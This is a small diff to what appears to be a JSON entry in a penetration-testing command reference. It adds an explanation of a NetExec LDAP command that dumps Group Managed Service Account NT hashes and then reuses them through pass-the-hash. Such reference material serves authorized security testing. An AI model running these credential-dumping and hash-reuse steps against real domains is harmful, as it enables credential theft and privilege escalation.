@@ -93,5 +93,6 @@
       "label": "Use the NT hash for the gMSA account",
       "command": "# pass-the-hash / overpass-the-hash as the gMSA (often high-priv)"
     }
-  ]
+  ],
+  "explain": "Reads Group Managed Service Account passwords over LDAP if your account is an authorized reader:\n  nxc ldap <dc_ip>         NetExec against the DC's LDAP\n  -u <user> -p <password>  authenticate\n  --gmsa                   dump msDS-ManagedPassword (the gMSA NT hash) for accounts you can read\ngMSA accounts are often high-privileged; take the returned NT hash into pass-the-hash / overpass-the-hash."
 }
